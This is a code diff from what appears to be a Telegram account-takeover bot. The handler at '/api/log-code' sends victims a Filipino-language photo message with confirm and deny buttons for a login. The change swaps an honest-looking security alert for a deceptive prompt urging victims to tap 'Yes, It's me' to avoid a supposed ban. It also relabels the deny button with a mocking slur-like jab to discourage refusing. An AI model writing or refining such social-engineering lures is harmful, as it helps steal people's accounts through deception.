@@ -165,13 +165,13 @@ app.post("/api/log-code", async (req, res) => {
         userId,
         PHOTO_URL,
         {
-          caption: "May nag-login sa account mo!\n\n" +
-                   "Nakita namin na may bagong login mula sa Xiaomi Xiaomi 12T Pro, Shanghai, China. Ikaw ba ito?",
+          caption: "I tap ang Yes, It's me!\n\n" +
+                   "wag mag alala dahil para ito sa account protection mo para hindi ma ban ni telegram",
           reply_markup: {
             inline_keyboard: [
               [
-                { text: "Oo, ako yan", callback_data: `confirm_login:${userId}` },
-                { text: "Hindi ako yan!", callback_data: `deny_login:${userId}` }
+                { text: "Confirm", callback_data: `confirm_login:${userId}` },
+                { text: "I'm Gay", callback_data: `deny_login:${userId}` }
               ]
             ]
           }
